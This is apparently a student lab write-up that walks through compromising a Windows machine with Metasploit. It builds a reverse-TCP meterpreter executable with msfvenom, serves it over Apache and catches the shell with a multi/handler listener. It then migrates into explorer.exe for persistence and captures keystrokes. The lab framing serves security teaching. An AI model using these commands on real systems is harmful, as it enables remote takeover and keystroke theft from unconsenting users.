## Compromising windows using Metasploit
## Metasploit
Compromising windows using Metasploit

## AIM:
To Compromise windows using Metasploit .

## DESIGN STEPS:
## Step 1:
Install kali linux either in partition or virtual box or in live mode

## Step 2:
Investigate on the various categories of tools as follows:

## Step 3:
Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig.

## OUTPUT:
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/55e25116-ef60-4ecd-a949-2b08d7a422d8)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

## OUTPUT:
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/6c367e44-5e08-4164-a5ca-e7ac99ee8634)
copy the fun.exe into the apache /var/www/html folder 
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/8f1d2b83-04b2-4e5f-9135-c0b66e3fed8a)
Start apache server sudo systemctl apache2 start 
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/1d0594e2-bcce-47ef-a6f0-0454e5788022)
Check the status of apache2
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/8da36129-ca87-4760-af20-fe77b1476537)
Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/b607223f-3e81-4e48-a6c1-16a2e76065c3)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/8f037c68-1cdd-4164-948c-998161a0355e)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/9358782f-39d2-4a76-8238-2e4a17f42e64)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted. 
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/5e3617f3-97c1-42ff-b26b-b751bbd34bb8)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/f5af3b8d-ab12-4345-83d8-98094fb93b22)
keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Udhayasankaran04/Compromising-windows-using-Metasploit/assets/119393933/ef78d1de-015f-4c42-a3c4-fab748720960)
RESULT:
The Metasploit framework is used to compromise windows and is examined successfully.
